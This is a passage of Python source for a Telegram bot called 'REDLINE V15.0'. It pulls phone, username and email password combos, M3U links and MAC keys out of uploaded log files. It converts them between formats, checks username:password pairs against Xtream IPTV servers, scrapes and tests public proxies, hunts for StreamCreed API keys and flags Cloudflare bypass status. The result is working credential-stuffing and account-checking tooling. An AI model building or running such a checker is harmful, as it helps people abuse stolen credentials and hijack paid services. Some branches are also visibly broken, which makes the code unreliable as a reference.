        lines.append(f"📊 Total Unique: {len(rev_domains)} domains")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("🔎 Reverse-IP Lookup Results")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("Source 2:")
        if preview_domains:
            row = []
            for i, d in enumerate(preview_domains, 1):
                row.append(f"🔗 {d}")
                if i % 2 == 0:
                    lines.append("          ".join(row))
                    row = []
            if row:
                lines.append("          ".join(row))
            if len(rev_domains) > preview_limit:
                lines.append("")
                lines.append(f"… and {len(rev_domains) - preview_limit} more")
        lines.append("")
        lines.append("──────────────────────")
        lines.append(f"📊 Total Found: {len(rev_domains)} Unique Domains")
        lines.append("──────────────────────")
        lines.append("")
        if not WHOISLookup._is_ip(domain):
            lines.append("🌐 Domain Analysis Results")
            lines.append("──────────────────────")
            lines.append(f"🌐 Domain: {domain}")
            lines.append("")
        lines.append("🌍 GeoIP Lookup:")
        lines.append(f"📍 {domain}")
        lines.append(f"📍 IP: {ip or '-'}")
        if geo:
            lines.append(f"🌍 Country: {geo.get('country_name','-')}")
            lines.append(f"🏢 Region: {geo.get('region','-')}")
            lines.append(f"🏢 City: {geo.get('city','-')}")
        lines.append("")
        lines.append("🔎 DNSDumpster Results")
        lines.append("──────────────────────")
        lines.append("")
        lines.append("🛡️ Name Servers:")
        lines.append("")
        for ns in ns_list[:10]:
            lines.append(f"   - 🌐 Host: {ns['host']}")
            if ns.get('ip'):
                lines.append(f"     - 📍 IP: {ns['ip']}")
            if ns.get('asn'):
                lines.append(f"     - 🏢 ASN: {ns['asn']}")
            if ns.get('country'):
                lines.append(f"     - 🌍 Country: {ns['country']}")
            lines.append("")
        lines.append("──────────────────────")
        lines.append("🔐 Protection Analysis")
        lines.append(f"🔐 Provider: {provider}")
        lines.append(f"{'✅' if bypass=='YES' else '❌'} Bypass: {bypass}")
        lines.append(f"{'✅' if cloudflare=='YES' else '❌'} Cloudflare: {cloudflare}")
        lines.append("──────────────────────")
        lines.append("🌐 Reverse IP Analysis Complete")
        lines.append(f"📊 Found: {len(rev_domains)} unique domains")
        lines.append("──────────────────────")
        lines.append(f"⏱️ Duration: {int(time.time()-t0)}s")
        lines.append(f"🔐 Protection: {provider} | Bypass: {bypass}")
        lines.append(f"🌐 Reverse IP domains: {len(rev_domains)}")
        lines.append("")
        lines.append("──────────────────────")
        lines.append("──────────────────────")
        lines.append("")
        if rdap:
            lines.append(f"---------- WHOIS for {domain} ----------")
            # Basic RDAP fields
            ns_r = rdap.get('nameservers') or []
            registrar = (rdap.get('registrar') or {}).get('name') if isinstance(rdap.get('registrar'), dict) else ''
            events = rdap.get('events') or []
            created = updated = expire = ''
            for ev in events:
                if ev.get('eventAction') == 'registration':
                    created = ev.get('eventDate','')
                elif ev.get('eventAction') == 'expiration':
                    expire = ev.get('eventDate','')
                elif ev.get('eventAction') == 'last changed':
                    updated = ev.get('eventDate','')
            lines.append(f"Registrar: {registrar or '-'}")
            if created:
                lines.append(f"Creation Date: {created}")
            if updated:
                lines.append(f"Updated Date: {updated}")
            if expire:
                lines.append(f"Registry Expiry Date: {expire}")
            if ns_r:
                for ns in ns_r:
                    n = ns.get('ldhName') if isinstance(ns, dict) else str(ns)
                    lines.append(f"Name Server: {n}")
            lines.append("")
        if geo:
            lines.append("---------- Geolocation ----------")
            lines.append(f"Query: {ip}")
            lines.append("Status: success")
            lines.append(f"Country: {geo.get('country_name','-')} ({geo.get('country','-')})")
            lines.append(f"Region: {geo.get('region','-')} ({geo.get('region_code','-')})")
            lines.append(f"City: {geo.get('city','-')}")
            if geo.get('postal'):
                lines.append(f"ZIP: {geo.get('postal')}")
            if geo.get('latitude') and geo.get('longitude'):
                lines.append(f"Lat/Lon: {geo.get('latitude')}, {geo.get('longitude')}")
                lines.append(f"Google Maps: https://www.google.com/maps?q={geo.get('latitude')},{geo.get('longitude')}")
            if geo.get('timezone'):
                lines.append(f"Timezone: {geo.get('timezone')}")
            if geo.get('org'):
                lines.append(f"ISP: {geo.get('org')}")
            if geo.get('asn'):
                lines.append(f"ASN: {geo.get('asn')}")
        lines.append("──────────────────────")
        lines.append(f"📊 Total Unique Domains: {len(rev_domains)}")
        lines.append(f"📅 Scan Date: {datetime.now().strftime('%d %B %Y')}")
        lines.append("──────────────────────")
        lines.append("")
        lines.append(f"💾 Analysis completed at: {datetime.now().strftime('%d %B %Y')}")
        lines.append("────────────────────────────────────────────────────────────")
        return (target, "\n".join(lines))

class KeywordSearcher:
    @staticmethod
    def search(text: str, keywords: List[str]) -> Dict[str, List[str]]:
        res: Dict[str, List[str]] = {}
        low = text.lower().split('\n')
        for kw in [k.strip() for k in keywords if k.strip()]:
            matches = []
            kwl = kw.lower()
            for line in low:
                if kwl in line:
                    matches.append(line.strip())
            if matches:
                res[kw] = matches[:1000]
        return res

class StreamCreedFinder:
    PATTERNS = [
        r'streamcreed[._-]?key["\s:=]+([A-Za-z0-9_-]{20,64})',
        r'sc[._-]?key["\s:=]+([A-Za-z0-9_-]{20,64})',
        r'apikey["\s:=]+([A-Za-z0-9_-]{32,64})',
    ]
    @staticmethod
    def find(text: str) -> Set[str]:
        out: Set[str] = set()
        for pat in StreamCreedFinder.PATTERNS:
            for m in re.finditer(pat, text, re.IGNORECASE):
                key = m.group(1)
                if len(key) >= 20:
                    out.add(key)
        return out

class ProxyFinder:
    SOURCES = [
        "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]
    @staticmethod
    def fetch(max_proxies: int = 200, timeout: int = 10) -> List[str]:
        if not HAS_REQUESTS:
            return []
        out: List[str] = []
        for src in ProxyFinder.SOURCES:
            try:
                r = Net.get(src, timeout=timeout)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if ':' in line and len(line.split(':')) == 2:
                            out.append(line)
                            if len(out) >= max_proxies:
                                return out
            except Exception:
                continue
        return out

    @staticmethod
    def test(proxy: str, timeout: int = 4) -> bool:
        if not HAS_REQUESTS:
            return False
        try:
            # Accept full URLs or host:port; test both http/https if no scheme
            candidates: List[str] = []
            if '://' in proxy:
                candidates = [proxy]
            else:
                candidates = [f'http://{proxy}', f'https://{proxy}']
            for px in candidates:
                proxies = {'http': px, 'https': px}
                try:
                    # Try HTTPS first for better coverage
                    r = Net.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
                    if r.status_code == 200:
                        return True
                except Exception:
                    pass
                try:
                    r = Net.get('http://httpbin.org/ip', proxies=proxies, timeout=timeout)
                    if r.status_code == 200:
                        return True
                except Exception:
                    pass
            return False
        except Exception:
            return False

    @staticmethod
    def fetch_and_validate(max_fetch: int = 200, validate_top: int = 50, workers: int = 20, timeout: int = 5) -> Tuple[List[str], List[str]]:
        """Fetch proxies from sources and validate a subset in parallel."""
        all_list = ProxyFinder.fetch(max_proxies=max_fetch, timeout=timeout)
        to_test = all_list[:validate_top]
        working: List[str] = []
        if to_test:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(ProxyFinder.test, p, timeout): p for p in to_test}
                for fu in as_completed(futs):
                    try:
                        ok = fu.result()
                        if ok:
                            working.append(futs[fu])
                    except Exception:
                        pass
        return all_list, working

# ============================================
# HEALTH CHECK WEB SERVER (for Koyeb)
# ============================================

class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path in ('/', '/health', '/status'):
                body = b'OK'
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                body = b'Not Found'
                self.send_response(404)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        except Exception:
            pass

def start_health_server():
    try:
        port = int(os.environ.get('PORT', '8000'))
        server = HTTPServer(('', port), _HealthHandler)
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        logger.info(f"🌐 Health server listening on port {port}")
    except Exception as e:
        logger.warning(f"Health server failed to start: {e}")

# ============================================
# GLOBAL ERROR HANDLER
# ============================================

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    # Ignore duplicate polling conflicts during rolling deploys
    if isinstance(err, telegram.error.Conflict):
        logger.warning("Ignoring Conflict: another getUpdates client detected. Ensure single instance.")
        return
    logger.error(f"Unhandled error: {err}")

# ============================================
# M3U CONVERTERS - TIER 1 FEATURE
# ============================================

class M3UConverter:
    """M3U and Combo converters"""
    
    @staticmethod
    def m3u_to_combo(m3u_text: str) -> Set[str]:
        """Convert M3U links to username:password"""
        results = set()
        
        for line in m3u_text.split('\n'):
            if 'get.php' in line and 'username=' in line and 'password=' in line:
                try:
                    user_match = re.search(r'username=([^&\s]+)', line)
                    pass_match = re.search(r'password=([^&\s]+)', line)
                    
                    if user_match and pass_match:
                        results.add(f"{user_match.group(1)}:{pass_match.group(1)}")
                except:
                    pass
        
        return results
    
    @staticmethod
    def combo_to_m3u(combo_text: str, base_url: str = None) -> Set[str]:
        """Convert username:password to M3U format"""
        results = set()
        
        for line in combo_text.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    username, password = parts
                    if base_url:
                        m3u_url = f"{base_url}/get.php?username={username}&password={password}&type=m3u_plus"
                        results.add(m3u_url)
                    else:
                        results.add(f"{username}:{password}")
        
        return results

# ============================================
# REDLINE EXTRACTION ENGINE
# ============================================

class RedlineExtractor:
    """
    Complete extraction engine with all REDLINE V15.0 features
    Contains all regex patterns and extraction logic
    """
    
    @staticmethod
    def extract_np(text: str) -> Set[str]:
        """
        Extract N:P (Phone:Password) combos
        Supports international formats and various separators
        """
        results = set()
        
        # Clean text first
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        # Phone number patterns
        patterns = [
            # International format with + 
            r'(\+\d{7,15}):([^\s:]+)',
            # Standard phone numbers
            r'(\d{10,15}):([a-zA-Z0-9@#$%^&*!_\-]+)',
            # With country code
            r'(\d{1,4}[\s-]?\d{7,14}):([^\s:]+)',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                phone = match.group(1).strip()
                password = match.group(2).strip()
                
                # Validation
                if len(password) >= 4 and len(phone) >= 7:
                    # Clean phone number
                    phone = re.sub(r'[^\d+]', '', phone)
                    if phone:
                        results.add(f"{phone}:{password}")
        
        return results
    
    @staticmethod
    def extract_up(text: str) -> Set[str]:
        """
        Extract U:P (Username:Password) combos
        Excludes emails and phone numbers
        """
        results = set()
        
        # Clean text
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        patterns = [
            # Standard username:password
            r'([a-zA-Z0-9._-]{3,30}):([^\s:]{4,})',
            # Username with underscores/dots
            r'([a-zA-Z][a-zA-Z0-9._-]{2,29}):([a-zA-Z0-9@#$%^&*!_\-]{4,})',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                username = match.group(1).strip()
                password = match.group(2).strip()
                
                # Validation - exclude emails and phones
                if (
                    '@' not in username and
                    not username.isdigit() and
                    len(username) >= 3 and
                    len(password) >= 4
                ):
                    results.add(f"{username}:{password}")
        
        return results
    
    @staticmethod
    def extract_mp(text: str) -> Set[str]:
        """
        Extract M:P (Email:Password) combos
        Validates email format
        """
        results = set()
        
        # Clean text
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        # Email pattern
        email_pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s:]{4,})'
        
        for match in re.finditer(email_pattern, text, re.MULTILINE):
            email = match.group(1).strip().lower()
            password = match.group(2).strip()
            
            # Validation
            if len(password) >= 4:
                results.add(f"{email}:{password}")
        
        return results
    
    @staticmethod
    def extract_m3u(text: str) -> Set[str]:
        """
        Extract M3U/M3U8 links
        Supports Xtream API and direct links
        """
        results = set()
        
        # Clean https to http
        text = text.replace("https://", "http://")
        
        # Pattern 1: Xtream API format
        xtream_pattern = r'http://[^\s\"]+/get\.php\?username=[^&\s]+&password=[^&\s]+(?:&type=m3u[_plus]*)?'
        
        for match in re.finditer(xtream_pattern, text, re.IGNORECASE):
            url = match.group(0)
            # Ensure type parameter
            if "&type=m3u" not in url:
                url = url + "&type=m3u_plus"
            results.add(url)
        
        # Pattern 2: Direct M3U8 links
        m3u8_pattern = r'http://[^\s\"]+\.m3u8(?:[^\s\"]*)'
        
        for match in re.finditer(m3u8_pattern, text, re.IGNORECASE):
            results.add(match.group(0))
        
        return results
    
    @staticmethod
    def extract_mac_key(text: str) -> Set[str]:
        """
        Extract MAC:KEY combos
        MAC address format validation
        """
        results = set()
        
        # MAC address patterns
        patterns = [
            # MAC with colons
            r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}):([a-zA-Z0-9]{8,})',
            # MAC with hyphens
            r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}):([a-zA-Z0-9]{8,})',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                mac = match.group(1).upper()
                key = match.group(2)
                results.add(f"{mac}:{key}")
        
        return results
    
    @staticmethod
    def extract_all(text: str) -> dict:
        """
        Extract ALL combo types
        Returns dictionary with each type
        """
        return {
            'np': RedlineExtractor.extract_np(text),
            'up': RedlineExtractor.extract_up(text),
            'mp': RedlineExtractor.extract_mp(text),
            'm3u': RedlineExtractor.extract_m3u(text),
            'mac': RedlineExtractor.extract_mac_key(text)
        }

# ============================================
# BOT USER INTERFACE
# ============================================

def get_main_menu() -> InlineKeyboardMarkup:
    """Create main menu keyboard - ALL ENGLISH"""
    keyboard = [
        [InlineKeyboardButton("═══ 📊 EXTRACTION ═══", callback_data="noop")],
        [
            InlineKeyboardButton("📱 N:P", callback_data="mode_np"),
            InlineKeyboardButton("👤 U:P", callback_data="mode_up"),
            InlineKeyboardButton("📧 M:P", callback_data="mode_mp")
        ],
        [
            InlineKeyboardButton("🔗 M3U", callback_data="mode_m3u"),
            InlineKeyboardButton("🔑 MAC", callback_data="mode_mac"),
            InlineKeyboardButton("⭐ ALL", callback_data="mode_all")
        ],
        [InlineKeyboardButton("═══ 🔗 M3U TOOLS ═══", callback_data="noop")],
        [
            InlineKeyboardButton("✅ Check Links", callback_data="check_m3u")
        ],
        [
            InlineKeyboardButton("🔄 M3U→Combo", callback_data="m3u_to_combo"),
            InlineKeyboardButton("🔄 Combo→M3U", callback_data="combo_to_m3u")
        ],
        [
            InlineKeyboardButton("🔀 M3U→MAC", callback_data="m3u_to_mac"),
            InlineKeyboardButton("↩️ MAC→M3U", callback_data="mac_to_m3u")
        ],
        [InlineKeyboardButton("═══ 🛠 PANEL TOOLS ═══", callback_data="noop")],
        [
            InlineKeyboardButton("🗂️ Panel Searcher", callback_data="panel_searcher"),
            InlineKeyboardButton("🟢 Check Live Panels", callback_data="check_panels")
        ],
        [InlineKeyboardButton("═══ ⚡ CHECKERS ═══", callback_data="noop")],
        [
            InlineKeyboardButton("⚡ U:P Xtream (1)", callback_data="up_xtream_single"),
            InlineKeyboardButton("🔍 M3U Manual (1)", callback_data="m3u_manual")
        ],
        [
            InlineKeyboardButton("⚡ U:P Xtream (Auto)", callback_data="up_xtream_auto")
        ],
        [
            InlineKeyboardButton("📱 MAC Host (1)", callback_data="mac_host_single"),
            InlineKeyboardButton("🧪 Combo Generator", callback_data="combo_generator")
        ],
        [InlineKeyboardButton("═══ 🧰 TOOLS ═══", callback_data="noop")],
        [
            InlineKeyboardButton("🔎 Keyword Searcher", callback_data="keyword_searcher"),
            InlineKeyboardButton("🗝️ StreamCreed", callback_data="streamcreed_finder")
        ],
        [
            InlineKeyboardButton("🌐 WHOIS", callback_data="whois_lookup"),
            InlineKeyboardButton("🌐 Proxy Finder", callback_data="proxy_finder")
        ],
        [InlineKeyboardButton("═══ ℹ️ INFO ═══", callback_data="noop")],
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
            InlineKeyboardButton("📊 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_button() -> InlineKeyboardMarkup:
    """Create back button"""
    keyboard = [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]]
    return InlineKeyboardMarkup(keyboard)

# ============================================
# BOT COMMAND HANDLERS
# ============================================

async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            logger.info(f"Blocked callback from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)}")
        except Exception:
            pass
        return
    await update.effective_message.reply_text("OK", quote=True)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    await update.effective_message.reply_text(f"Chat ID: {getattr(chat,'id',None)}", quote=True)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed_chat(update):
        return
    await update.effective_message.reply_html(
        "🔥 <b>REDLINE V15.0</b>\n"
        "Use the menu buttons to run tools.\n"
        "Upload files in the channel to start batch flows."
    )
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - show welcome and main menu - ALL ENGLISH"""
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            logger.info(f"Blocked /start from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)}")
        except Exception:
            pass
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        return
    user = update.effective_user
    
    welcome_text = (
        f"👋 Welcome {user.mention_html()}!\n\n"
        "🔥 <b>REDLINE V15.0</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Select an option below:"
    )
    
    await update.effective_message.reply_html(
        welcome_text,
        reply_markup=get_main_menu()
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button callbacks - ALL ENGLISH"""
    query = update.callback_query
    await query.answer()
    if not allowed_chat(update):
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        return
    mode = context.user_data.get('mode', '')
    data = query.data
    
    # No-op for section headers
    if data == "noop":
        return

    # Back to main
    if data == "back":
        context.user_data.clear()
        await query.edit_message_text(
            "👋 Welcome!\n\n"
            "🔥 <b>REDLINE V15.0</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Select an option below:",
            parse_mode='HTML',
            reply_markup=get_main_menu()
        )
        return

    # === Settings ===
    if data == "settings":
        context.user_data.clear()
        context.user_data['mode'] = 'settings'
        s = GLOBAL_SETTINGS
        txt = (
            "<b>⚙️ Settings</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Proxy: <b>{'ON' if s.get('proxy_enabled') else 'OFF'}</b> | <code>{s.get('proxy_value') or '-'}</code>\n"
            f"Include Channels (Auto): <b>{'ON' if s.get('include_channels_auto') else 'OFF'}</b>\n"
            f"Workers: <b>{s.get('workers')}</b>\n"
            f"M3U Limit: <b>{s.get('m3u_limit')}</b> | Combos Limit: <b>{s.get('combo_limit')}</b>\n\n"
            "Use buttons below to toggle or set values."
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔌 Proxy ON/OFF", callback_data="settings_toggle_proxy"), InlineKeyboardButton("✏️ Set Proxy", callback_data="settings_set_proxy")],
            [InlineKeyboardButton("📺 Channels (Auto) ON/OFF", callback_data="settings_toggle_channels")],
            [InlineKeyboardButton("👷 Workers: 6", callback_data="settings_workers_6"), InlineKeyboardButton("12", callback_data="settings_workers_12"), InlineKeyboardButton("20", callback_data="settings_workers_20")],
            [InlineKeyboardButton("⬅️ Back", callback_data="back")]
        ])
        await query.edit_message_text(txt, parse_mode='HTML', reply_markup=kb)
        return

    if data.startswith("settings_workers_"):
        try:
            w = int(data.split('_')[-1])
            GLOBAL_SETTINGS['workers'] = w
            save_settings()
        except Exception:
            pass
        await query.answer("Workers updated")
        await query.message.reply_text("⚙️ Settings updated. Open Settings again to view.")
        return

    if data == "settings_toggle_proxy":
        GLOBAL_SETTINGS['proxy_enabled'] = not GLOBAL_SETTINGS.get('proxy_enabled')
        save_settings()
        await query.answer("Proxy toggled")
        await query.message.reply_text("🔌 Proxy toggled. Open Settings to view.")
        return

    if data == "settings_set_proxy":
        context.user_data.clear()
        context.user_data['mode'] = 'settings_set_proxy'
        await query.edit_message_text(
            "<b>✏️ Set Proxy</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send proxy as <code>host:port</code> or full URL (e.g., <code>http://host:port</code> or <code>socks5://host:port</code>).",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    if data == "settings_toggle_channels":
        GLOBAL_SETTINGS['include_channels_auto'] = not GLOBAL_SETTINGS.get('include_channels_auto')
        save_settings()
        await query.answer("Channels (Auto) toggled")
        await query.message.reply_text("📺 Include Channels in Auto toggled.")
        return

    # === Phase 3: U:P Xtream Auto (batch) ===
    if data == "up_xtream_auto":
        context.user_data.clear()
        context.user_data['mode'] = 'up_xtream_auto'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>⚡ U:P Xtream Check (Auto)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: WHOIS Lookup ===
    if data == "whois_lookup":
        context.user_data.clear()
        context.user_data['mode'] = 'whois_lookup'
        await query.edit_message_text(
            "<b>🌐 WHOIS Lookup</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IP or domain (e.g., <code>8.8.8.8</code> or <code>example.com</code>)",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: Keyword Searcher ===
    if data == "keyword_searcher":
        context.user_data.clear()
        context.user_data['mode'] = 'keyword_searcher'
        await query.edit_message_text(
            "<b>🔎 Logs Keyword Searcher</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📤 Send log/text file first, then send keywords (comma separated).",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: StreamCreed Finder ===
    if data == "streamcreed_finder":
        context.user_data.clear()
        context.user_data['mode'] = 'streamcreed_finder'
        await query.edit_message_text(
            "<b>🗝️ StreamCreed Key Finder</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📤 Send log/text file to scan for keys.",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: Proxy Finder ===
    if data == "proxy_finder":
        context.user_data.clear()
        context.user_data['mode'] = 'proxy_finder'
        await query.edit_message_text(
            "<b>🌐 Proxy Finder</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⏳ Collecting proxies from trusted sources...",
            parse_mode='HTML'
        )
        # Fetch and validate in parallel
        proxies, working = ProxyFinder.fetch_and_validate(max_fetch=200, validate_top=50, workers=20, timeout=5)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"PROXIES_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# Proxy Finder\n# Total scraped: {len(proxies)} | Working (tested): {len(working)}\n\n")
            if working:
                f.write("# === WORKING (tested) ===\n")
                for w in working:
                    f.write(w + "\n")
                f.write("\n")
            f.write("# === ALL SCRAPED ===\n")
            for p in proxies:
                f.write(p + "\n")
        with open(result_path, 'rb') as f:
            await query.edit_message_caption(
                caption=(
                    f"✅ <b>Proxy Finder Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Scraped: {len(proxies)} • Working: {len(working)}"
                ),
                parse_mode='HTML'
            ) if False else None
        # Send as new message (edit_message_caption may not apply)
        with open(result_path, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Proxy Finder Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Scraped: {len(proxies)} • Working: {len(working)}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    

    # PHASE 3: U:P Xtream Single (host then user:pass)
    if mode == 'up_xtream_single':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_combo'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send combo as <code>username:password</code>"
            )
            return
        elif step == 'ask_combo':
            combo = update.message.text.strip()
            if ':' not in combo:
                await update.message.reply_html("❌ <b>Invalid format</b>. Use <code>username:password</code>")
                return
            username, password = combo.split(':', 1)
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Checking Xtream...</b>")
            ok = False
            info = ''
            if HAS_REQUESTS:
                try:
                    url = f"{host}/player_api.php?username={username}&password={password}"
                    r = Net.get(url, timeout=8, allow_redirects=True, proxies=get_proxies())
                    if r.status_code == 200:
                        ok = True
                        info = (r.text or '')[:400]
                    else:
                        info = f"HTTP {r.status_code}"
                except Exception as e:
                    info = f"Error: {str(e)}"
            caption = (
                "✅ <b>Valid</b>" if ok else "❌ <b>Invalid</b>"
            ) + f"\nHost: <code>{host}</code>\nUser: <code>{username}</code>\n"
            await status_msg.edit_text(caption, parse_mode='HTML')
            context.user_data.clear()
            return

    # PHASE 3: M3U Manual (single URL)
    if mode == 'm3u_manual':
        url = update.message.text.strip()
        if not url.startswith(('http://','https://')):
            await update.message.reply_html("❌ <b>Invalid URL</b>")
            return
        status_msg = await update.message.reply_html("⏳ <b>Probing M3U...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        except Exception:
            pass
        ok, info, err = M3UProbe.probe(url, timeout=8, proxies=get_proxies())
        if ok:
            try:
                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=5, proxies=get_proxies(), max_kb=256)
                if ch:
                    info['channels'] = ch
            except Exception:
                pass
            block = M3UProbe.format_manual_block(info)
            await status_msg.edit_text(block)
        else:
            await status_msg.edit_text(f"❌ Failed: {err}")
        context.user_data.clear()
        return

    # Settings: set proxy value (text input)
    if mode == 'settings_set_proxy':
        pv = (update.message.text or '').strip()
        GLOBAL_SETTINGS['proxy_value'] = pv
        save_settings()
        await update.message.reply_html("✅ <b>Proxy value saved.</b>\nOpen ⚙️ Settings to verify.")
        context.user_data.clear()
        return

    # PHASE 3: MAC → M3U (ask host then mac, build m3u)
    if mode == 'mac_to_m3u':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Building M3U from MAC...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.UPLOAD_DOCUMENT)
        except Exception:
            pass
            channels: List[Dict] = []
            error = ''
            if HAS_REQUESTS:
                channels, error = MACConverter.mac_to_m3u(host, mac)
            if error:
                await status_msg.edit_text(f"❌ {error}")
                context.user_data.clear()
                return
            if not channels:
                await status_msg.edit_text("❌ No channels returned")
                context.user_data.clear()
                return
            # Try fetch profile for expiry
            prof = MACConverter.mac_profile(host, mac)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"MAC_TO_M3U_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                if prof.get('expires'):
                    f.write(f"# EXPIRES: {prof['expires']}\n")
                for ch in channels:
                    name = ch.get('name') or f"CH-{ch.get('id','')}"
                    group = ch.get('group') or 'Unknown'
                    url = ch.get('url') or ''
                    if not url:
                        continue
                    f.write(f"#EXTINF:-1 group-title=\"{group}\",{name}\n")
                    f.write(url + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>MAC → M3U Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Channels: {len(channels):,}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(result_path)
